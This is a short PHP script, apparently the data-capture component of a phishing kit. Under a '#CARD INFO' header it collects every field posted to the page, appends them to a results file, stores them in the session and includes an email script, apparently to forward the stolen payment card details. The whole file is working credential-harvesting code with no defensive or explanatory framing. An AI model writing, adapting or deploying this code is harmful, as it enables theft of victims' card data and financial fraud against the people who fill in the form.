<?php 
session_start();
include '../../email.php';
ob_start();
$line = "##############################";
//CREATE RESULT FILE
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$card = "$line
#CARD INFO
$line
";
foreach($_POST as $var => $val){
	$var2 = str_replace("+"," ",$var);
	$card .= "[$var2] => $val
";
}
$_SESSION['card'] = $card;
$fp = fopen("../../result.txt",'a');
fwrite($fp, $card);
fclose($fp);
exit();
}

?>